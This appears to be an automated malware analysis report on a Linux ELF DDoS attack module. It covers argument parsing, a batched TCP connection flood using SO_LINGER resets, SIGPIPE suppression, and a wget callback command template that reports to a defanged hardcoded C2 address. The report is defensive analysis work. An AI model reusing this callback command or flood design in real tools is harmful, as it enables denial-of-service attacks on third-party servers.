> 
> Aliases: cf0/cf1 reporting module, Linux x86-64 DDoS attack component, Mirai-style ELF attack module
> 
> After this ELF was executed directly in an isolated dynamic environment, it indeed repeatedly created non-blocking TCP sockets and issued connect to the target address/port specified by argv, while also invoking /bin/sh via a system call to run a built-in wget command that reports to the /r/ path of the hardcoded address 45.198.224[.]130:80. Static decompilation and runtime system-call tracing corroborate each other: this is an attack component used to launch TCP connection floods (DDoS) and call back to report, not a normal business program.

## Behavior Analysis

There are **6** behaviors in total, each backed by evidence; **2** of them are statically available and **4** were obtained through dynamic analysis.

### 1. Parse target and duration parameters

`T1498` · Confidence **high** · Static

The program requires argc>=4 and reads from the command line argv[1]=target IP (validated with inet_pton), argv[2]=target port (atoi/htons), argv[3]=duration in seconds, argv[4]=thread limit, argv[5]=tag; '.' in the tag is replaced with '-', and the tag is then used to build the reporting path.

> **Evidence**: main @0x3c0; calls atoi(rva 0x1929), inet_pton(rva 0xfbc), htons(rva 0xfb7); returns 1/2 directly when the arguments are not satisfied
> 
> **Source**: `ref:f6dbd8750f` · `ref:0dc4ae60fc`

### 2. Callback reporting via shell

`T1071.001` · Confidence **high** · Dynamic

Uses snprintf to build "wget -O /dev/null hxxp://45.198.224[.]130/r/%s-%s-%ld >/dev/null 2>&1 &" and hands it to system for execution, spawning /bin/sh -c and wget child processes that report attack status to a hardcoded HTTP endpoint; the run log shows wget requesting /r/cf0-testname-0 and attempting to connect to 45.198.224[.]130:80.

> **Evidence**: .rodata 0x48c0="cf0", 0x48c4="cf1", 0x48c8 holds the wget template; main calls snprintf(rva 0x176c) then system(rva 0x12bf); dynamic trace shows write(2, "--...-- hxxp://45.198.224[.]130/r/cf0-testname-0") and connect(45.198.224[.]130:80) returning ENETUNREACH
> 
> **Source**: `ref:f56074ec03` · `ref:f6dbd8750f` · `ref:71ae78a6ce`

### 3. Launch TCP connection flood

`T1498.001` · Confidence **high** · Dynamic

In batches, loops executing socket(AF_INET, SOCK_STREAM|SOCK_NONBLOCK) and connect to the target IP:port; each batch uses at most min(500, thread limit/50) sockets, intended to exhaust the target's connection resources or occupy the server-side connection table.

> **Evidence**: main @0x3c0 inner loop; socket(rva 0x1227), connect(rva 0xf89); dynamic trace shows consecutive socket(AF_INET, SOCK_STREAM|SOCK_NONBLOCK) and connect(127.0.0[.]1:9) events (test parameters)
> 
> **Source**: `ref:f6dbd8750f` · `ref:71ae78a6ce`

### 4. Reclaim connections quickly via RST

`T1498.001` · Confidence **high** · Dynamic

Each socket sets SO_LINGER {l_onoff=1, l_linger=0} before connect, so close sends an RST directly; each batch holds its connections for 20ms, then closes them one by one and moves to the next batch, repeatedly rebuilding/discarding connections at a high rate.

> **Evidence**: setsockopt(rva 0x1203, SOL_SOCKET, SO_LINGER, 8 bytes {0x01,0,0,0,0,0,0,0}) and close(rva 0x1c0d) in main; dynamic trace shows setsockopt(..., SO_LINGER, {l_onoff=1, l_linger=0}) and the following close
> 
> **Source**: `ref:f6dbd8750f` · `ref:71ae78a6ce`

### 5. Report attack count on expiry

`T1071.001` · Confidence **high** · Static

The main loop uses time to compare the start time against the duration in seconds; on expiry it builds one more wget report whose path uses the "cf1" prefix and carries the cumulative attempt counter, then returns 0 to exit.

> **Evidence**: time(rva 0x1be6), local counter local_1c8 in main, the second snprintf uses .rodata 0x48c4 ("cf1"); string scan hits the full template at off 18632
> 
> **Source**: `ref:f6dbd8750f` · `ref:f56074ec03`

### 6. Ignore SIGPIPE to stay alive

`T1498` · Confidence **high** · Dynamic

At startup SIGPIPE (13) is set to ignore, preventing the process from being killed by the signal when writes on many non-blocking sockets fail, so the flood loop keeps running for the configured duration.

> **Evidence**: signal(0xd, SIG_IGN) at the start of main; the disassembly shows mov edi, 0xd followed by call rva 0x16e9; dynamic trace rt_sigaction(SIGPIPE, SIG_IGN)
> 
> **Source**: `ref:0dc4ae60fc` · `ref:71ae78a6ce`

## Do Not Misjudge

:::important
The following conclusions are **easy to misjudge**; please note them when citing this report.

- Do not classify this as a downloader or dropper: the wget target is /dev/null, used only for status reporting; no payload download, file drop, or secondary execution was observed.
- Do not classify this as ransomware, a stealer, or a cryptor: the sample contains no cryptographic constants (AES/SHA/RC4, etc.) and no file traversal or credential-reading logic.
- Do not treat 45.198.224[.]130 as the attacked target: it is the sample's callback/reporting endpoint; the actual flooded target is specified at runtime by command-line arguments.
- Do not claim that a successful C2 session was observed: the isolated environment has no external network, only connect attempts and ENETUNREACH appeared, and C2 exploitability still requires network-connected verification.
- Do not treat it as a complete RAT/botnet main body: this file is only a parameter-driven attack module and contains no command parsing, persistence, or self-update logic.
:::

**Limitations and pending verification**

1. The isolated environment has no network; the C2 callback only produced ENETUNREACH and no complete HTTP request/response was obtained, so c2 is marked as static with pending_dynamic_verify=true.
2. The server-side semantics of the reporting endpoint (meaning of return values, whether follow-up tasks are delivered) cannot be confirmed under no-network conditions.
3. Family attribution relies only on the sample's own strings (cf0/cf1, compilation unit cf3.c) and code features, lacking vendor naming or multi-engine corroboration, and is marked as uncertain.
4. The sample requires the attack target and duration to be supplied externally; this run used only one set of test parameters and did not cover all parameter boundaries or extreme concurrency configurations.
5. The sample is an attack module, not a complete botnet main body; its parent loader/delivery chain is not included in this sample and cannot be assessed.
